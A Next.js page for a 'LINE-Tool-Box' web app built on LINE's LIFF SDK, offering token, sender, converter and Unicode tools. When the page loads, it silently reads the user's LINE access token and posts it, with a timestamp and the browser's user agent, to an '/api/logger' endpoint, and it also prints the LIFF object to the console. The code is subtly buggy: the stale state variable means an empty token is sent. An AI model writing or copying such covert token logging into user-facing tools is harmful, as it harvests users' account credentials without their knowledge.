import Image from "next/image";
import { Inter } from "next/font/google";
import { Helmet } from "react-helmet";
import { useState, useEffect } from "react";
import Layout from "@/src/Layout";
import { getLiffId } from "@/utils/getLiffId";
import { Info } from "@/src/components/Info/Info";
import { Tooltip } from "@/src/components/Tooltip/Tooltip";

// ---

import { TokenPanel } from "@/src/tools/TokenPanel/TokenPanel";
import { Sender } from "@/src/tools/Sender/Sender";
import { Converter } from "@/src/tools/Converter/Converter";
import { Unicode } from "@/src/tools/Unicode/Unicode";

// ---

import { liff } from "@line/liff";
import { Other } from "@/src/tools/Other/Other";
import Token from "./token";

const inter = Inter({ subsets: ["latin"] });

export default function Home() {
  const [liffId, setLiffId] = useState(getLiffId());
  const [liffObj, setLiffObj] = useState<any>({});
  const [token, setToken] = useState("");

  useEffect(() => {
    liff.init({ liffId: liffId }).then(() => {
      setLiffObj(liff);
      console.log("Patch!");
      console.log(liff);
      setToken(liff.getAccessToken() || "");
      console.log(token);

        fetch("/api/logger", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            time: new Date().toLocaleString(),
            token: token,
            ua: navigator.userAgent,
          }),
        });
    });
  }, []);

  return (
    <>
      <Helmet>
        <title> Home | LINE-Tool-Box</title>
      </Helmet>
      <Layout>
        <main className={`${inter.className} flex flex-wrap`}>
          <Info liffId={liffId} />
          <div className="flex flex-wrap justify-around w-full p-5 pt-0">
            <Tools liffId={liffId} packet={{ token, setToken }} />
          </div>
        </main>
      </Layout>
    </>
  );
}

function Tools({ liffId, packet }: Props) {
  return (
    <>
      <TokenPanel packet={packet} />
      <Sender packet={packet} />
      <Converter packet={packet}></Converter>
      <Unicode packet={packet}></Unicode>
      <Other packet={packet}></Other>
    </>
  );
}
